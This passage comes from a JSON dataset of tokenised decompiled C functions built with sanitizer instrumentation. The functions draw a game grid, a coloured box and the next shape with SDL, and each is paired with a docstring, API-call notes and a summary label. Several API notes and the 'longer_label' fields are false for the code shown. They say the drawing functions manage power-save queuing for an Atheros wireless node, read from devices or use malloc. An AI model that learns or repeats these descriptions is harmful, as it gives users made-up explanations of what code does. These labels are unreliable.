            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            "=",
            "v7",
            ";",
            "v8",
            "=",
            "23",
            "*",
            "i",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x17u",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_233E20",
            ",",
            "i",
            ",",
            "23L",
            "L",
            ")",
            ";",
            "v6",
            "=",
            "__OFADD__",
            "(",
            "50",
            ",",
            "v8",
            ")",
            ";",
            "v9",
            "=",
            "v8",
            "+",
            "50",
            ";",
            "if",
            "(",
            "v6",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233E60",
            ",",
            "23",
            "*",
            "i",
            ",",
            "50L",
            "L",
            ")",
            ";",
            "v10",
            "=",
            "v9",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "v10",
            "=",
            "v2",
            "+",
            "36",
            ";",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "36",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "36",
            ")",
            "=",
            "v10",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "40",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "40",
            ")",
            "=",
            "23",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "44",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "44",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "44",
            ")",
            "=",
            "23",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_2337A0",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_2337E0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_233820",
            ",",
            "g",
            ")",
            ";",
            "v11",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v11",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "4",
            "*",
            "i",
            "+",
            "j",
            "-",
            "79",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v11",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load1",
            "(",
            "&",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ")",
            ";",
            "}",
            "v12",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v11",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v11",
            ">",
            "1u",
            ")",
            "__ubsan_handle_load_invalid_value",
            "(",
            "&",
            "off_236480",
            ",",
            "v12",
            ")",
            ";",
            "if",
            "(",
            "v12",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_233880",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_2338C0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_233900",
            ",",
            "g",
            ")",
            ";",
            "v13",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v13",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "4",
            "*",
            "i",
            "+",
            "j",
            "-",
            "79",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v13",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ")",
            ";",
            "b",
            "=",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_233960",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_2339A0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2339E0",
            ",",
            "g",
            ")",
            ";",
            "v14",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v14",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "4",
            "*",
            "i",
            "+",
            "j",
            "-",
            "79",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v14",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ")",
            ";",
            "v16",
            "=",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_233A40",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_233A80",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_233AC0",
            ",",
            "g",
            ")",
            ";",
            "v15",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v15",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "4",
            "*",
            "i",
            "+",
            "j",
            "-",
            "79",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v15",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ")",
            ";",
            "SDL_SetRenderDrawColor",
            "(",
            "rend",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "-",
            ">",
            "next",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "r",
            ",",
            "v16",
            ",",
            "b",
            ",",
            "255L",
            "L",
            ")",
            ";",
            "}",
            "else",
            "{",
            "SDL_SetRenderDrawColor",
            "(",
            "rend",
            ",",
            "255L",
            "L",
            ",",
            "255L",
            "L",
            ",",
            "255L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "}",
            "SDL_RenderFillRect",
            "(",
            "rend",
            ",",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233EA0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233EE0",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v21",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"an_stack\" is used to enable or disable the power save queuing mechanism for an IEEE 802.11 node in an Atheros wireless network.",
            "The function \"malloc\" appears to be used for dynamic memory allocation, as shown in the code snippets where it is used to allocate memory for various data structures and arrays.",
            "The __read function is used to read data from a device or file, possibly through ioctl operations, and may also interact with a dump file or shared library functions.",
            "This function likely deals with processing or manipulating 64-bit quantities (quadwords) in a low-level programming language such as assembly or C."
        ],
        "longer_label": "The code includes memory allocation using the malloc function, reading data from a device or file using the __read function, and enabling or disabling the power save queuing mechanism for an IEEE 802.11 node in an Atheros wireless network."
    },
    {
        "id": 229,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "draw",
            "a",
            "filled",
            "box",
            "with",
            "specified",
            "dimensions",
            "and",
            "color",
            "on",
            "a",
            "SDL",
            "renderer",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "SDL_Renderer_0",
            "*",
            "rend",
            ",",
            "int",
            "x",
            ",",
            "int",
            "y",
            ",",
            "int",
            "w",
            ",",
            "int",
            "h",
            ",",
            "int",
            "r",
            ",",
            "int",
            "g",
            ",",
            "int",
            "b",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "unsigned",
            "__int64",
            "v10",
            ";",
            "unsigned",
            "__int8",
            "ra",
            ";",
            "char",
            "v15",
            "[",
            "88",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "ra",
            "=",
            "r",
            ";",
            "v8",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v15",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v9",
            "=",
            "__asan_stack_malloc_0",
            "(",
            "64L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v9",
            ")",
            "v8",
            "=",
            "v9",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v8",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v8",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 16 4 rect \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v8",
            "+",
            "16",
            ")",
            "=",
            "drawBox",
            ";",
            "v10",
            "=",
            "v8",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v10",
            "+",
            "2147450884",
            ")",
            "=",
            "-",
            "219021312",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v8",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v8",
            "+",
            "32",
            ")",
            "=",
            "x",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v8",
            "+",
            "36",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v8",
            "+",
            "36",
            ")",
            "=",
            "y",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v8",
            "+",
            "40",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v8",
            "+",
            "40",
            ")",
            "=",
            "w",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "44",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v8",
            "+",
            "44",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v8",
            "+",
            "44",
            ")",
            "=",
            "h",
            ";",
            "SDL_SetRenderDrawColor",
            "(",
            "rend",
            ",",
            "ra",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "b",
            ",",
            "255L",
            "L",
            ")",
            ";",
            "SDL_RenderFillRect",
            "(",
            "rend",
            ",",
            "v8",
            "+",
            "32",
            ")",
            ";",
            "SDL_SetRenderDrawColor",
            "(",
            "rend",
            ",",
            "255L",
            "L",
            ",",
            "255L",
            "L",
            ",",
            "255L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v15",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v8",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v8",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v8",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v8",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "This function appears to be related to managing the Power Saving Queue (PSQ) in a wireless network, specifically setting the PSQ for the given node.",
            "The \"malloc\" function appears to be used for allocating memory dynamically in C programming, as seen in the code snippets where it is used to allocate memory for various data structures and operations.",
            "The fsqword function is used to read an unsigned 64-bit value from the FS segment register."
        ],
        "longer_label": "The code is for drawing a colored box on an SDL renderer with dynamic memory allocation and utilization of the Power Saving Queue for a wireless network node."
    },
    {
        "id": 230,
        "docstring_tokens": [
            "The",
            "code",
            "draws",
            "a",
            "grid",
            "of",
            "squares",
            "on",
            "an",
            "SDL",
            "renderer",
            "based",
            "on",
            "the",
            "game",
            "state",
            ",",
            "colors",
            "the",
            "squares",
            "accordingly",
            ",",
            "and",
            "then",
            "calls",
            "functions",
            "to",
            "draw",
            "a",
            "shape",
            "and",
            "display",
            "the",
            "next",
            "shape",
            "on",
            "the",
            "renderer",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ",",
            "SDL_Renderer_0",
            "*",
            "rend",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "bool",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "bool",
            "v12",
            ";",
            "char",
            "v13",
            ";",
            "char",
            "v14",
            ";",
            "char",
            "v15",
            ";",
            "int",
            "y",
            ";",
            "unsigned",
            "int",
            "v17",
            ";",
            "unsigned",
            "int",
            "b",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "char",
            "v22",
            "[",
            "88",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v23",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v22",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v3",
            "=",
            "__asan_stack_malloc_0",
            "(",
            "64L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 16 1 r \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "16",
            ")",
            "=",
            "draw",
            ";",
            "v4",
            "=",
            "v2",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "2147450884",
            ")",
            "=",
            "-",
            "219021312",
            ";",
            "v23",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0xAu",
            ",",
            "0x2Eu",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_234460",
            ",",
            "46L",
            "L",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "16",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "10",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "v5",
            "=",
            "46",
            "*",
            "j",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x2Eu",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_2344E0",
            ",",
            "j",
            ",",
            "46L",
            "L",
            ")",
            ";",
            "v6",
            "=",
            "__OFADD__",
            "(",
            "v5",
            ",",
            "141",
            ")",
            ";",
            "v7",
            "=",
            "v5",
            "+",
            "141",
            ";",
            "if",
            "(",
            "v6",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_234520",
            ",",
            "141L",
            "L",
            ",",
            "46",
            "*",
            "j",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            "=",
            "v7",
            ";",
            "v8",
            "=",
            "46",
            "*",
            "i",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x2Eu",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_234560",
            ",",
            "i",
            ",",
            "46L",
            "L",
            ")",
            ";",
            "v6",
            "=",
            "__OFADD__",
            "(",
            "10",
            ",",
            "v8",
            ")",
            ";",
            "v9",
            "=",
            "v8",
            "+",
            "10",
            ";",
            "if",
            "(",
            "v6",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2345A0",
            ",",
            "46",
            "*",
            "i",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "v10",
            "=",
            "v9",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "v10",
            "=",
            "v2",
            "+",
            "36",
            ";",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "36",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "36",
            ")",
            "=",
            "v10",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v2",
            "+",
            "40",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "40",
            ")",
            "=",
            "46",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "44",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
